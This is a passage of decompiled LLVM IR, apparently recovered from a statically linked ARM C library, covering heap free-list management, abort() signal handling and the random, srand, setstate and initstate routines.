  store i32 %v2_b620, i32* %r0.global-to-local, align 4
  br i1 %v2_b618, label %dec_label_pc_b68c.preheader, label %bb

bb:                                               ; preds = %entry
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b68c.preheader

dec_label_pc_b68c.preheader:                      ; preds = %entry, %bb
  %v1_b640 = phi i32 [ %v1_b610, %entry ], [ 12, %bb ]
  %v2_b68c9 = icmp eq i32 %v2_b620, 0
  br i1 %v2_b68c9, label %dec_label_pc_b694, label %dec_label_pc_b62c

dec_label_pc_b62c:                                ; preds = %dec_label_pc_b68c.preheader, %dec_label_pc_b688
  %v2_b644 = phi i32 [ %v3_b688, %dec_label_pc_b688 ], [ %v2_b620, %dec_label_pc_b68c.preheader ]
  %v1_b62c = inttoptr i32 %v2_b644 to i32*
  %v2_b62c = load i32, i32* %v1_b62c, align 4
  store i32 %v2_b62c, i32* @ip, align 4
  %v3_b630 = icmp ult i32 %v2_b62c, %v1_b640
  br i1 %v3_b630, label %dec_label_pc_b688, label %dec_label_pc_b638

dec_label_pc_b638:                                ; preds = %dec_label_pc_b62c
  %v1_b638 = add i32 %v1_b640, 44
  %v3_b63c = icmp ult i32 %v2_b62c, %v1_b638
  br i1 %v3_b63c, label %dec_label_pc_b64c, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_b638
  %v2_b630.le = sub i32 %v2_b62c, %v1_b640
  store i32 %v2_b630.le, i32* %v1_b62c, align 4
  %v0_b678.pre = load i32, i32* @ip, align 4
  %v0_b680.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_b64c:                                ; preds = %dec_label_pc_b638
  %v1_b64c = add i32 %v2_b644, 4
  %v2_b64c = inttoptr i32 %v1_b64c to i32*
  %v3_b64c = load i32, i32* %v2_b64c, align 4
  store i32 %v3_b64c, i32* %r2.global-to-local, align 4
  %v2_b650 = icmp eq i32 %v3_b64c, 0
  br i1 %v2_b650, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_b64c
  %v2_b654 = add i32 %v2_b644, 8
  %v3_b654 = inttoptr i32 %v2_b654 to i32*
  %v4_b654 = load i32, i32* %v3_b654, align 4
  %v3_b658 = add i32 %v3_b64c, 8
  %v4_b658 = inttoptr i32 %v3_b658 to i32*
  store i32 %v4_b654, i32* %v4_b658, align 4
  %v0_b65c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_b64c, %bb27
  %v0_b65c = phi i32 [ %v2_b644, %dec_label_pc_b64c ], [ %v0_b65c.pre, %bb27 ]
  %v1_b65c = add i32 %v0_b65c, 8
  %v2_b65c = inttoptr i32 %v1_b65c to i32*
  %v3_b65c = load i32, i32* %v2_b65c, align 4
  %v1_b660 = add i32 %v0_b65c, 4
  %v2_b660 = inttoptr i32 %v1_b660 to i32*
  %v3_b660 = load i32, i32* %v2_b660, align 4
  %v2_b664 = icmp eq i32 %v3_b65c, 0
  br i1 %v2_b664, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_b668 = add i32 %v3_b65c, 4
  %v4_b668 = inttoptr i32 %v3_b668 to i32*
  store i32 %v3_b660, i32* %v4_b668, align 4
  %v1_b670 = load i32, i32* @ip, align 4
  store i32 %v1_b670, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_b66c = load i32, i32* %r1.global-to-local, align 4
  %v3_b66c = inttoptr i32 %v2_b66c to i32*
  store i32 %v3_b660, i32* %v3_b66c, align 4
  %v1_b674.pre = load i32, i32* @ip, align 4
  store i32 %v1_b674.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_b680 = phi i32 [ %v0_b680.pre, %.thread._crit_edge ], [ %v1_b670, %bb28 ], [ %v1_b674.pre, %.thread5 ]
  %v0_b678 = phi i32 [ %v0_b678.pre, %.thread._crit_edge ], [ %v1_b670, %bb28 ], [ %v1_b674.pre, %.thread5 ]
  %v1_b678 = load i32, i32* %r0.global-to-local, align 4
  %v2_b678 = sub i32 %v1_b678, %v0_b678
  %v1_b67c = add i32 %v2_b678, 12
  store i32 %v1_b67c, i32* %r0.global-to-local, align 4
  %v1_b680 = load i32, i32* %r4.global-to-local, align 4
  %v2_b680 = inttoptr i32 %v1_b680 to i32*
  store i32 %v0_b680, i32* %v2_b680, align 4
  %v2_b684 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_b684, i32* %r4.global-to-local, align 4
  ret i32 %v1_b67c

dec_label_pc_b688:                                ; preds = %dec_label_pc_b62c
  %v1_b688 = add i32 %v2_b644, 4
  %v2_b688 = inttoptr i32 %v1_b688 to i32*
  %v3_b688 = load i32, i32* %v2_b688, align 4
  store i32 %v3_b688, i32* %r0.global-to-local, align 4
  %v2_b68c = icmp eq i32 %v3_b688, 0
  br i1 %v2_b68c, label %dec_label_pc_b68c.dec_label_pc_b694_crit_edge, label %dec_label_pc_b62c

dec_label_pc_b68c.dec_label_pc_b694_crit_edge:    ; preds = %dec_label_pc_b688
  br label %dec_label_pc_b694

dec_label_pc_b694:                                ; preds = %dec_label_pc_b68c.dec_label_pc_b694_crit_edge, %dec_label_pc_b68c.preheader
  store i32 %v3_b608, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_b688, { 1, 2, 0 }
  uselistorder i32 %v0_b65c, { 1, 0 }
  uselistorder i32 %v2_b62c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_b644, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_b640, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_b62c, { 1, 0 }
  uselistorder label %dec_label_pc_b68c.preheader, { 1, 0 }
}

define i32 @__heap_link_free_area() local_unnamed_addr {
entry:
  %v0_b698 = load i32, i32* @r2, align 4
  %v2_b698 = icmp eq i32 %v0_b698, 0
  %v0_b69c = load i32, i32* @r3, align 4
  %v1_b69c = load i32, i32* @r1, align 4
  %v2_b69c = add i32 %v1_b69c, 4
  %v3_b69c = inttoptr i32 %v2_b69c to i32*
  store i32 %v0_b69c, i32* %v3_b69c, align 4
  %v0_b6a0 = load i32, i32* @r2, align 4
  %v1_b6a0 = load i32, i32* @r1, align 4
  %v2_b6a0 = add i32 %v1_b6a0, 8
  %v3_b6a0 = inttoptr i32 %v2_b6a0 to i32*
  store i32 %v0_b6a0, i32* %v3_b6a0, align 4
  %v1_b6a8 = load i32, i32* @r1, align 4
  br i1 %v2_b698, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_b6a4 = load i32, i32* @r2, align 4
  %v3_b6a4 = add i32 %v2_b6a4, 4
  %v4_b6a4 = inttoptr i32 %v3_b6a4 to i32*
  store i32 %v1_b6a8, i32* %v4_b6a4, align 4
  br label %bb1

.thread:                                          ; preds = %entry
  %v2_b6a8 = load i32, i32* @r0, align 4
  %v3_b6a8 = inttoptr i32 %v2_b6a8 to i32*
  store i32 %v1_b6a8, i32* %v3_b6a8, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_b6ac = load i32, i32* @r3, align 4
  %v2_b6ac = icmp eq i32 %v0_b6ac, 0
  br i1 %v2_b6ac, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_b6b0 = load i32, i32* @r1, align 4
  %v3_b6b0 = add i32 %v0_b6ac, 8
  %v4_b6b0 = inttoptr i32 %v3_b6b0 to i32*
  store i32 %v1_b6b0, i32* %v4_b6b0, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_b6b4 = load i32, i32* @r0, align 4
  ret i32 %v1_b6b4

; uselistorder directives
  uselistorder i32 %v1_b6a8, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__heap_link_free_area_after() local_unnamed_addr {
entry:
  %v0_b6b8 = load i32, i32* @r2, align 4
  %v2_b6b8 = icmp eq i32 %v0_b6b8, 0
  %v1_b6bc = load i32, i32* @r1, align 4
  br i1 %v2_b6b8, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_b6bc = load i32, i32* @r0, align 4
  %v3_b6bc = inttoptr i32 %v2_b6bc to i32*
  store i32 %v1_b6bc, i32* %v3_b6bc, align 4
  br label %bb2

.thread:                                          ; preds = %entry
  %v3_b6c0 = add i32 %v0_b6b8, 4
  %v4_b6c0 = inttoptr i32 %v3_b6c0 to i32*
  store i32 %v1_b6bc, i32* %v4_b6c0, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_b6c4 = load i32, i32* @r2, align 4
  %v1_b6c4 = load i32, i32* @r1, align 4
  %v2_b6c4 = add i32 %v1_b6c4, 8
  %v3_b6c4 = inttoptr i32 %v2_b6c4 to i32*
  store i32 %v0_b6c4, i32* %v3_b6c4, align 4
  %v1_b6c8 = load i32, i32* @r0, align 4
  ret i32 %v1_b6c8

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_b6cc = load i32, i32* @r4, align 4
  store i32 %v3_b6cc, i32* %stack_var_-20, align 4
  %v2_b6d0 = load i32, i32* %arg1, align 4
  store i32 %v2_b6d0, i32* %r4.global-to-local, align 4
  %v2_b6d4 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_b6f02 = icmp eq i32 %v2_b6d0, 0
  br i1 %v2_b6f02, label %dec_label_pc_b7a0, label %dec_label_pc_b6e0

dec_label_pc_b6e0:                                ; preds = %entry, %dec_label_pc_b6e8
  %v0_b730 = phi i32 [ %v0_b738, %dec_label_pc_b6e8 ], [ 0, %entry ]
  %v0_b738 = phi i32 [ %v3_b6ec, %dec_label_pc_b6e8 ], [ %v2_b6d0, %entry ]
  %v1_b6f45.in = phi i32 [ %v3_b6ec, %dec_label_pc_b6e8 ], [ %v2_b6d0, %entry ]
  %v1_b6f45 = add i32 %v1_b6f45.in, 12
  %v3_b6e0 = icmp ult i32 %v1_b6f45, %arg2
  br i1 %v3_b6e0, label %dec_label_pc_b6e8, label %dec_label_pc_b700

dec_label_pc_b6e8:                                ; preds = %dec_label_pc_b6e0
  store i32 %v0_b738, i32* %r6.global-to-local, align 4
  %v1_b6ec = add i32 %v0_b738, 4
  %v2_b6ec = inttoptr i32 %v1_b6ec to i32*
  %v3_b6ec = load i32, i32* %v2_b6ec, align 4
  store i32 %v3_b6ec, i32* %r4.global-to-local, align 4
  %v2_b6f0 = icmp eq i32 %v3_b6ec, 0
  br i1 %v2_b6f0, label %dec_label_pc_b6f0.dec_label_pc_b7a0.loopexit_crit_edge, label %dec_label_pc_b6e0

dec_label_pc_b700:                                ; preds = %dec_label_pc_b6e0
  %v1_b700 = inttoptr i32 %v0_b738 to i32*
  %v2_b700 = load i32, i32* %v1_b700, align 4
  store i32 %v2_b700, i32* @ip, align 4
  %v2_b704 = sub i32 %v0_b738, %v2_b700
  %v1_b708 = add i32 %v2_b704, 12
  %v3_b70c = icmp uge i32 %v1_b708, %v2_b6d4
  %v9_b70c = icmp eq i32 %v1_b708, %v2_b6d4
  %v2_b710 = xor i1 %v9_b70c, true
  %v3_b710 = and i1 %v3_b70c, %v2_b710
  br i1 %v3_b710, label %dec_label_pc_b7a0, label %dec_label_pc_b714

dec_label_pc_b714:                                ; preds = %dec_label_pc_b700
  %v2_b714 = add i32 %v2_b700, %arg3
  store i32 %v2_b714, i32* %r7.global-to-local, align 4
  br i1 %v9_b70c, label %dec_label_pc_b71c, label %dec_label_pc_b748

dec_label_pc_b71c:                                ; preds = %dec_label_pc_b714
  %v2_b71c = icmp eq i32 %v0_b730, 0
  br i1 %v2_b71c, label %dec_label_pc_b794, label %dec_label_pc_b724

dec_label_pc_b724:                                ; preds = %dec_label_pc_b71c
  %v1_b724 = add i32 %v0_b730, 12
  %v9_b728 = icmp eq i32 %v1_b724, %arg2
  br i1 %v9_b728, label %dec_label_pc_b730, label %dec_label_pc_b794

dec_label_pc_b730:                                ; preds = %dec_label_pc_b724
  %v1_b730 = inttoptr i32 %v0_b730 to i32*
  %v2_b730 = load i32, i32* %v1_b730, align 4
  %v1_b734 = add i32 %v0_b730, 8
  %v2_b734 = inttoptr i32 %v1_b734 to i32*
  %v3_b734 = load i32, i32* %v2_b734, align 4
  store i32 %v3_b734, i32* @r2, align 4
  store i32 %v0_b738, i32* @r1, align 4
  %v2_b73c = add i32 %v2_b730, %v2_b714
  store i32 %v2_b73c, i32* %r7.global-to-local, align 4
  %v0_b740 = call i32 @__heap_link_free_area_after()
  br label %dec_label_pc_b794

dec_label_pc_b748:                                ; preds = %dec_label_pc_b714
  %v1_b748 = add i32 %v0_b738, 4
  %v2_b748 = inttoptr i32 %v1_b748 to i32*
  %v3_b748 = load i32, i32* %v2_b748, align 4
  store i32 %v3_b748, i32* %r5.global-to-local, align 4
  %v2_b74c = icmp eq i32 %v3_b748, 0
  br i1 %v2_b74c, label %dec_label_pc_b780, label %dec_label_pc_b754

dec_label_pc_b754:                                ; preds = %dec_label_pc_b748
  %v1_b754 = inttoptr i32 %v3_b748 to i32*
  %v2_b754 = load i32, i32* %v1_b754, align 4
  store i32 %v2_b754, i32* @ip, align 4
  %v2_b758 = sub i32 %v3_b748, %v2_b754
  %v1_b75c = add i32 %v2_b758, 12
  %v9_b760 = icmp eq i32 %v2_b6d4, %v1_b75c
  br i1 %v9_b760, label %dec_label_pc_b768, label %dec_label_pc_b780

dec_label_pc_b768:                                ; preds = %dec_label_pc_b754
  store i32 %v0_b730, i32* @r2, align 4
  store i32 %v3_b748, i32* @r1, align 4
  %v2_b770 = add i32 %v2_b754, %v2_b714
  store i32 %v2_b770, i32* %r7.global-to-local, align 4
  %v0_b774 = call i32 @__heap_link_free_area_after()
  %v0_b778 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_b778, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_b794

dec_label_pc_b780:                                ; preds = %dec_label_pc_b754, %dec_label_pc_b748
  %v2_b780 = add i32 %v0_b738, %arg3
  store i32 %v2_b780, i32* %r4.global-to-local, align 4
  store i32 %v3_b748, i32* @r3, align 4
  store i32 %v0_b730, i32* @r2, align 4
  store i32 %v2_b780, i32* @r1, align 4
  %v0_b790 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_b794

dec_label_pc_b794:                                ; preds = %dec_label_pc_b724, %dec_label_pc_b71c, %dec_label_pc_b768, %dec_label_pc_b730, %dec_label_pc_b780
  %v0_b794 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_b794, i32* %r5.global-to-local, align 4
  %v0_b798 = load i32, i32* %r7.global-to-local, align 4
  %v2_b798 = inttoptr i32 %v0_b794 to i32*
  store i32 %v0_b798, i32* %v2_b798, align 4
  br label %dec_label_pc_b7b8

dec_label_pc_b6f0.dec_label_pc_b7a0.loopexit_crit_edge: ; preds = %dec_label_pc_b6e8
  br label %dec_label_pc_b7a0

dec_label_pc_b7a0:                                ; preds = %entry, %dec_label_pc_b6f0.dec_label_pc_b7a0.loopexit_crit_edge, %dec_label_pc_b700
  %v1_b7a0 = add i32 %v2_b6d4, -12
  store i32 %v1_b7a0, i32* %r5.global-to-local, align 4
  %v3_b7a4 = inttoptr i32 %v1_b7a0 to i32*
  store i32 %arg3, i32* %v3_b7a4, align 4
  %v0_b7a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_b7a8, i32* @r3, align 4
  %v0_b7ac = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_b7ac, i32* @r2, align 4
  %v0_b7b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_b7b0, i32* @r1, align 4
  %v0_b7b4 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_b7b8

dec_label_pc_b7b8:                                ; preds = %dec_label_pc_b794, %dec_label_pc_b7a0
  %v0_b7b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_b7bc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_b7bc, i32* @r4, align 4
  ret i32 %v0_b7b8

; uselistorder directives
  uselistorder i32 %v3_b748, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_b70c, { 1, 0 }
  uselistorder i32 %v3_b6ec, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b738, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_b730, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @__heap_link_free_area, { 1, 0 }
  uselistorder i32 ()* @__heap_link_free_area_after, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_b7b8, { 1, 0 }
  uselistorder label %dec_label_pc_b7a0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_b794, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_b6e0, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
dec_label_pc_b7dc.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_b7c0 = ptrtoint i32* %stack_var_-268 to i32
  %v1_b7d0 = call i32 @__pthread_return_0()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_b7dc = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_b7dc

dec_label_pc_b7dc:                                ; preds = %dec_label_pc_b7dc.lr.ph, %dec_label_pc_b7dc
  %v1_b7e0 = phi i32 [ 31, %dec_label_pc_b7dc.lr.ph ], [ %v1_b7ec, %dec_label_pc_b7dc ]
  %v4_b7e0 = mul i32 %v1_b7e0, 4
  %v5_b7e0 = add i32 %v4_b7e0, %v2_b7dc
  %v2_b7e8 = add i32 %v5_b7e0, -128
  %v3_b7e8 = inttoptr i32 %v2_b7e8 to i32*
  store i32 0, i32* %v3_b7e8, align 4
  %v0_b7ec = load i32, i32* %r1.global-to-local, align 4
  %v1_b7ec = add i32 %v0_b7ec, -1
  store i32 %v1_b7ec, i32* %r1.global-to-local, align 4
  %v6_b7ec = icmp slt i32 %v1_b7ec, 0
  br i1 %v6_b7ec, label %dec_label_pc_b7f4, label %dec_label_pc_b7dc

dec_label_pc_b7f4:                                ; preds = %dec_label_pc_b7dc
  %v2_b7f4 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_b7f4, i32* @r4, align 4
  store i32 6, i32* %r1.global-to-local, align 4
  %v2_b800 = call i32 @__sigaddset(i32 %v2_b7f4, i32 6)
  %v2_b804 = icmp eq i32 %v2_b800, 0
  br i1 %v2_b804, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_b7f4
  store i32 %v2_b7f4, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_b7f4, %bb
  store i32 47128, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_b804, i32 ptrtoint (i32* @global_var_c62c.121 to i32))
  %v2_b81c = load i32, i32* @global_var_1baa8.123, align 4
  %v2_b820 = icmp eq i32 %v2_b81c, 0
  br i1 %v2_b820, label %dec_label_pc_b828, label %dec_label_pc_b858

dec_label_pc_b828:                                ; preds = %.thread1
  store i32 1, i32* @global_var_1baa8.123, align 4
  br label %dec_label_pc_b830

dec_label_pc_b830:                                ; preds = %dec_label_pc_b8a8, %dec_label_pc_b828
  store i32 47168, i32* @lr, align 4
  %v1_b83c = call i32 @__pthread_return_0()
  %v1_b844 = call i32 @__raise(i32 6)
  store i32 47192, i32* @lr, align 4
  %v1_b854 = call i32 @__pthread_return_0()
  %v2_b85c.pre = load i32, i32* @global_var_1baa8.123, align 4
  br label %dec_label_pc_b858

dec_label_pc_b858:                                ; preds = %.thread1, %dec_label_pc_b830
  %v0_b8cc = phi i32 [ %v2_b81c, %.thread1 ], [ %v2_b85c.pre, %dec_label_pc_b830 ]
  store i32 ptrtoint (i32* @global_var_1baa8.123 to i32), i32* %ip.global-to-local, align 4
  %v7_b860 = icmp eq i32 %v0_b8cc, 1
  br i1 %v7_b860, label %dec_label_pc_b890.lr.ph, label %dec_label_pc_b8c4

dec_label_pc_b890.lr.ph:                          ; preds = %dec_label_pc_b858
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_1baa8.123, align 4
  %v2_b87c = bitcast i32* %stack_var_-268 to i8*
  %v3_b87c = call i32 @__GI_memset(i8* %v2_b87c, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_b890

dec_label_pc_b890:                                ; preds = %dec_label_pc_b890.lr.ph, %dec_label_pc_b890
  %v1_b894 = phi i32 [ 31, %dec_label_pc_b890.lr.ph ], [ %v1_b8a0, %dec_label_pc_b890 ]
  %v4_b894 = mul i32 %v1_b894, 4
  %v5_b894 = add i32 %v4_b894, %v2_b7dc
  %v2_b89c = add i32 %v5_b894, -264
  %v3_b89c = inttoptr i32 %v2_b89c to i32*
  store i32 -1, i32* %v3_b89c, align 4
  %v0_b8a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_b8a0 = add i32 %v0_b8a0, -1
  store i32 %v1_b8a0, i32* %r1.global-to-local, align 4
  %v6_b8a0 = icmp slt i32 %v1_b8a0, 0
  br i1 %v6_b8a0, label %dec_label_pc_b8a8, label %dec_label_pc_b890

dec_label_pc_b8a8:                                ; preds = %dec_label_pc_b890
  store i32 %v2_b7c0, i32* %r1.global-to-local, align 4
  %v4_b8bc = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_b830

dec_label_pc_b8c4:                                ; preds = %dec_label_pc_b858
  %v7_b8c4 = icmp eq i32 %v0_b8cc, 2
  br i1 %v7_b8c4, label %dec_label_pc_b8cc, label %dec_label_pc_b8d8

dec_label_pc_b8cc:                                ; preds = %dec_label_pc_b8c4
  store i32 3, i32* @global_var_1baa8.123, align 4
  %v0_b8d4 = call i32 @abort()
  %v2_b8d8.pre = load i32, i32* @global_var_1baa8.123, align 4
  br label %dec_label_pc_b8d8

dec_label_pc_b8d8:                                ; preds = %dec_label_pc_b8c4, %dec_label_pc_b8cc
  %v1_b8e0 = phi i32 [ %v0_b8cc, %dec_label_pc_b8c4 ], [ %v2_b8d8.pre, %dec_label_pc_b8cc ]
  %v7_b8dc = icmp eq i32 %v1_b8e0, 3
  br i1 %v7_b8dc, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_b8d8
  %v2_b8e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_b8e8 = inttoptr i32 %v2_b8e8 to i32*
  store i32 4, i32* %v3_b8e8, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_b8d8, %bb27
  call void @__pseudo_cond_branch(i1 %v7_b8dc, i32 ptrtoint (i32* @global_var_a86c.125 to i32))
  br label %dec_label_pc_b8f0

dec_label_pc_b8f0:                                ; preds = %dec_label_pc_b8f0, %.thread3
  %v0_b8f0 = call i32 @abort()
  br label %dec_label_pc_b8f0

; uselistorder directives
  uselistorder i32 %v1_b8a0, { 2, 1, 0 }
  uselistorder i32 %v1_b7ec, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 7, 8, 5, 6, 9, 1, 2, 4, 3, 0 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 1, 0 }
  uselistorder i32* @global_var_1baa8.123, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_b8d8, { 1, 0 }
  uselistorder label %dec_label_pc_b890, { 1, 0 }
  uselistorder label %dec_label_pc_b858, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_b7dc, { 1, 0 }
}

define i32 @random(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1b640.127 to i32), i32* @r4, align 4
  %v2_b910 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_b910, i32* @r0, align 4
  %v1_b928 = call i32 @__pthread_return_void()
  %v1_b938 = call i32 @__pthread_return_0()
  %v2_b93c = ptrtoint i32* %stack_var_-16 to i32
  %v3_b944 = call i32 @__GI_random_r(i32* inttoptr (i32 112216 to i32*), i32 %v2_b93c)
  store i32 %v2_b910, i32* @r0, align 4
  %v1_b958 = call i32 @__pthread_return_void()
  %v3_b95c = load i32, i32* %stack_var_-16, align 4
  ret i32 %v3_b95c
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_b988 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_b988, i32* @r0, align 4
  %v1_b9a4 = call i32 @__pthread_return_void()
  %v1_b9b4 = call i32 @__pthread_return_0()
  %v3_b9c4 = load i32, i32* bitcast (i32** @global_var_1b660.140 to i32*), align 4
  store i32 %v3_b9c4, i32* @r4, align 4
  %v3_b9c8 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_1b658)
  %v1_b9d0 = icmp slt i32 %v3_b9c8, 0
  store i32 %v2_b988, i32* @r0, align 4
  %. = select i1 %v1_b9d0, i32 0, i32 ptrtoint (i32** @global_var_1b65c.142 to i32)
  %v1_b9e8 = call i32 @__pthread_return_void()
  ret i32 %.
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_ba18 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %v2_ba18, i32* @r0, align 4
  %v1_ba3c = call i32 @__pthread_return_void()
  %v1_ba4c = call i32 @__pthread_return_0()
  %v0_ba54 = load i32, i32* @r5, align 4
  %v0_ba58 = load i32, i32* @r6, align 4
  %v0_ba5c = load i32, i32* @r8, align 4
  store i32 %v0_ba5c, i32* @r0, align 4
  %v3_ba60 = load i32, i32* bitcast (i32** @global_var_1b660.140 to i32*), align 4
  store i32 %v3_ba60, i32* @r4, align 4
  %v4_ba64 = inttoptr i32 %v0_ba5c to i32*
  %v5_ba64 = call i32 @__GI_initstate_r(i32* %v4_ba64, i32 %v0_ba54, i32 %v0_ba58, i32 ptrtoint (i32* @global_var_1b658 to i32))
  store i32 %v2_ba18, i32* @r0, align 4
  %v1_ba78 = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_1b65c.142 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_baa8 = load i32, i32* @r4, align 4
  %v9_baa8 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_1b640.127 to i32), i32* @r4, align 4
  %v2_bab0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_bab0, i32* @r0, align 4
  %v1_bacc = call i32 @__pthread_return_void()
  %v1_badc = call i32 @__pthread_return_0()
  %v0_bae0 = load i32, i32* @r6, align 4
  store i32 %v0_bae0, i32* @r0, align 4
  %v2_bae8 = inttoptr i32 %v0_bae0 to i32*
  %v3_bae8 = call i32 @srandom_r(i32* %v2_bae8, i32 ptrtoint (i32* @global_var_1b658 to i32))
  store i32 %v2_bab0, i32* @r0, align 4
  store i32 47876, i32* @lr, align 4
  %v1_bb00 = call i32 @__pthread_return_void()
  store i32 %v3_baa8, i32* @r4, align 4
  store i32 %v9_baa8, i32* @r6, align 4
  ret i32 %v1_bb00

; uselistorder directives
  uselistorder i32* @global_var_1b658, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1b658 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_bb24 = add i32 %tmp, 12
  %v2_bb24 = inttoptr i32 %v1_bb24 to i32*
  %v3_bb24 = load i32, i32* %v2_bb24, align 4
